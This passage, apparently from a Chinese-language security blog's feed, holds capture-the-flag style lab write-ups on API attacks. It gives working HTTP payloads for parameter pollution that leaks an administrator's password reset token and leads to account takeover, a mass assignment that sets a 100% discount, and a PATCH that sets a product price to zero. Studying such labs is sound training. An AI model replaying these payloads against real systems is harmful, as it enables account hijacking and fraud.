+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=../administrator
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">404&lt;/span> &lt;span style="color:#a6e22e">Not Found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;type&amp;#34;: &amp;#34;error&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;result&amp;#34;: &amp;#34;Invalid route. Please refer to the API definition&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;li>尝试不断累加&lt;code>../&lt;/code>在&lt;code>username&lt;/code>参数值，直到&lt;code>../../../../%23&lt;/code>时出现不同的Response&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=../../../../%23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">500&lt;/span> &lt;span style="color:#a6e22e">Internal Server Error&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;error&amp;#34;: &amp;#34;Unexpected response from API server:\n&amp;lt;html&amp;gt;\n&amp;lt;head&amp;gt;\n &amp;lt;meta charset=\&amp;#34;UTF-8\&amp;#34;&amp;gt;\n &amp;lt;title&amp;gt;Not Found&amp;lt;\/title&amp;gt;\n&amp;lt;\/head&amp;gt;\n&amp;lt;body&amp;gt;\n &amp;lt;h1&amp;gt;Not found&amp;lt;\/h1&amp;gt;\n &amp;lt;p&amp;gt;The URL that you requested was not found.&amp;lt;\/p&amp;gt;\n&amp;lt;\/body&amp;gt;\n&amp;lt;\/html&amp;gt;\n&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="6">
+&lt;li>尝试使用常见的&lt;code>API Doudumnet&lt;/code>路径&lt;code>openapi.json&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=../../../../openapi.json%23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">500&lt;/span> &lt;span style="color:#a6e22e">Internal Server Error&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;error&amp;#34;: &amp;#34;Unexpected response from API server:\n{\n \&amp;#34;openapi\&amp;#34;: \&amp;#34;3.0.0\&amp;#34;,\n \&amp;#34;info\&amp;#34;: {\n \&amp;#34;title\&amp;#34;: \&amp;#34;User API\&amp;#34;,\n \&amp;#34;version\&amp;#34;: \&amp;#34;2.0.0\&amp;#34;\n },\n \&amp;#34;paths\&amp;#34;: {\n \&amp;#34;/api/internal/v1/users/{username}/field/{field}\&amp;#34;: {\n \&amp;#34;get\&amp;#34;: {\n \&amp;#34;tags\&amp;#34;: [\n \&amp;#34;users\&amp;#34;\n ],\n \&amp;#34;summary\&amp;#34;: \&amp;#34;Find user by username\&amp;#34;,\n \&amp;#34;description\&amp;#34;: \&amp;#34;API Version 1\&amp;#34;,\n \&amp;#34;parameters\&amp;#34;: [\n {\n \&amp;#34;name\&amp;#34;: \&amp;#34;username\&amp;#34;,\n \&amp;#34;in\&amp;#34;: \&amp;#34;path\&amp;#34;,\n \&amp;#34;description\&amp;#34;: \&amp;#34;Username\&amp;#34;,\n \&amp;#34;required\&amp;#34;: true,\n \&amp;#34;schema\&amp;#34;: {\n ...&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="7">
+&lt;li>上述Response内提到&lt;code>&amp;quot;paths&amp;quot;: {&amp;quot;/api/internal/v1/users/{username}/field/{field}&amp;quot;&lt;/code>，先使用已确认的&lt;code>field&lt;/code>值&lt;code>email&lt;/code>进行测试&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=administrator/field/email%23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;email&amp;#34;,&amp;#34;result&amp;#34;:&amp;#34;*****@normal-user.net&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="8">
+&lt;li>尝试使用javascript所需要的&lt;code>passwordResetToken&lt;/code>带入参数值&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=administrator/field/passwordResetToken%23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;type&amp;#34;: &amp;#34;error&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;result&amp;#34;: &amp;#34;This version of API only supports the email field for security reasons&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="9">
+&lt;li>使用上述方法，改变请求路径&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=ggMJHz5JIKl90W1Q9yAVGrfX17FHMXfF&amp;amp;username=../../v1/users/administrator/field/passwordResetToken%23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;type&amp;#34;: &amp;#34;passwordResetToken&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;result&amp;#34;: &amp;#34;lhmlp7nljksrfuajdxtk6dtfp9j4st5z&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>回到页面使用&lt;code>/forgot-password?passwordResetToken=lhmlp7nljksrfuajdxtk6dtfp9j4st5z&lt;/code>进行访问
+&lt;img alt="Reset password" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url-3.jpg">&lt;/li>
+&lt;li>使用更新后的密码登录&lt;code>administrator&lt;/code>，登录成功后点击右上方的&lt;code>Admin panel&lt;/code>
+&lt;img alt="Admin panel" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-rest-url-4.jpg">&lt;/li>
+&lt;li>点击&lt;code>carlos - Delete&lt;/code>后即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Exploiting a mass assignment vulnerability</title><link>/posts/2024/api-testing-lab-exploiting-mass-assignment-vulnerability/</link><pubDate>Sun, 15 Dec 2024 14:34:06 +0800</pubDate><guid>/posts/2024/api-testing-lab-exploiting-mass-assignment-vulnerability/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-mass-assignment-vulnerability-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-mass-assignment-vulnerability-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
+&lt;li>点击&lt;code>Home&lt;/code>回到商品页，并点击&lt;code>Lightweight &amp;quot;l33t&amp;quot; Leather Jacket&lt;/code>商品&lt;code>View details&lt;/code>&lt;/li>
+&lt;li>进入商品详细页后点击页面最下方&lt;code>Add to cart&lt;/code>后，点击页面右上方&lt;code>购物车&lt;/code>进入购物车页面，对应Request
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /api/checkout &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;chosen_discount&amp;#34;:{&amp;#34;percentage&amp;#34;:0},&amp;#34;chosen_products&amp;#34;:[{&amp;#34;product_id&amp;#34;:&amp;#34;1&amp;#34;,&amp;#34;name&amp;#34;:&amp;#34;Lightweight \&amp;#34;l33t\&amp;#34; Leather Jacket&amp;#34;,&amp;#34;quantity&amp;#34;:1,&amp;#34;item_price&amp;#34;:133700}]}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>使用&lt;code>OPTION&lt;/code>查看可用的&lt;code>HTTP Methods&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">OPTION /api/checkout HTTP/2
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">405&lt;/span> &lt;span style="color:#a6e22e">Method Not Allowed&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Allow&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">POST, GET&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Method Not Allowed&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>尝试使用&lt;code>PATCH&lt;/code>Method，将&lt;code>GET&lt;/code>的返回作为Request body，并修改&lt;code>chosen_discount&lt;/code>内的参数为&lt;code>100&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /api/checkout &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;chosen_discount&amp;#34;:{&amp;#34;percentage&amp;#34;:100},&amp;#34;chosen_products&amp;#34;:[{&amp;#34;product_id&amp;#34;:&amp;#34;1&amp;#34;,&amp;#34;name&amp;#34;:&amp;#34;Lightweight \&amp;#34;l33t\&amp;#34; Leather Jacket&amp;#34;,&amp;#34;quantity&amp;#34;:1,&amp;#34;item_price&amp;#34;:133700}]}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">201&lt;/span> &lt;span style="color:#a6e22e">Created&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/cart/order-confirmation?order-confirmed=true&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>回到页面即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Finding and exploiting an unused API endpoint</title><link>/posts/2024/api-testing-lab-exploiting-unused-api-endpoint/</link><pubDate>Sun, 15 Dec 2024 13:07:53 +0800</pubDate><guid>/posts/2024/api-testing-lab-exploiting-unused-api-endpoint/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-unused-api-endpoint-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-unused-api-endpoint-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
+&lt;li>点击&lt;code>Home&lt;/code>回到商品页，并点击&lt;code>Lightweight &amp;quot;l33t&amp;quot; Leather Jacket&lt;/code>商品&lt;code>View details&lt;/code>，对应Request
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /api/products/1/price &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>使用&lt;code>OPTION&lt;/code>查看可用的&lt;code>HTTP Methods&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">OPTION /api/products/1/price HTTP/2
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">405&lt;/span> &lt;span style="color:#a6e22e">Method Not Allowed&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Allow&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">GET, PATCH&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Method Not Allowed&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>尝试使用&lt;code>PATCH&lt;/code>Method
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">PATCH&lt;/span> /api/products/1/price &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;ClientError&amp;#34;,&amp;#34;code&amp;#34;:400,&amp;#34;error&amp;#34;:&amp;#34;Only &amp;#39;application/json&amp;#39; Content-Type is supported&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>新增请求头&lt;code>Content-Type: application/json&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">PATCH&lt;/span> /api/products/1/price &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;type&amp;#34;:&amp;#34;ClientError&amp;#34;,&amp;#34;code&amp;#34;:400,&amp;#34;error&amp;#34;:&amp;#34;&amp;#39;price&amp;#39; parameter missing in body&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>新增&lt;code>request body&lt;/code>中&lt;code>price&lt;/code>参数
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">PATCH&lt;/span> /api/products/1/price &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&lt;span style="color:#f92672">&amp;#34;price&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;price&amp;#34;:&amp;#34;$0.00&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>回到页面后看到商品价格为0元
+&lt;img alt="Price" src="/img/2024/api-testing-lab-exploiting-unused-api-endpoint-2.jpg">&lt;/li>
+&lt;li>在商品内容最下方点击&lt;code>Add to cart&lt;/code>后，点击页面右上方&lt;code>购物车&lt;/code>进入购物车页面，点击&lt;code>Place order&lt;/code>即可解题
+&lt;img alt="Place order" src="/img/2024/api-testing-lab-exploiting-unused-api-endpoint-3.jpg">
+`&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Exploiting server-side parameter pollution in a query string</title><link>/posts/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string/</link><pubDate>Sat, 14 Dec 2024 22:59:14 +0800</pubDate><guid>/posts/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击右上角&lt;code>My account&lt;/code>进入登录页面，点击&lt;code>Forgot password?&lt;/code>&lt;/li>
+&lt;li>输入&lt;code>administrator&lt;/code>后点击&lt;code>Submit&lt;/code>，对应Request
+&lt;img alt="Lab description" src="/img/2024/api-testing-lab-exploiting-server-side-parameter-pollution-in-query-string-2.jpg">
